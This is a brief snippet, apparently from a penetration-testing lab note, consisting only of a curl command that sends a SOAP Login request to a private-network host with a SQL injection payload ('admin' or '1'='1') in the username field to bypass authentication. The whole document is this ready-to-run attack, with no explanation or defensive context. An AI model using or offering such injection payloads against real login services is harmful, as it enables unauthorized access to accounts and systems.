____

```bash
curl -X POST http://10.129.202.133:3002/wsdl \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"Login\"" \
  -d "<?xml version='1.0' encoding='utf-8'?>
<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:tem='http://tempuri.org/'>
   <soapenv:Header/>
   <soapenv:Body>
      <tem:LoginRequest>
         <tem:username>admin' or '1'='1</tem:username>
         <tem:password>your_password</tem:password>
      </tem:LoginRequest>
   </soapenv:Body>
</soapenv:Envelope>"
```

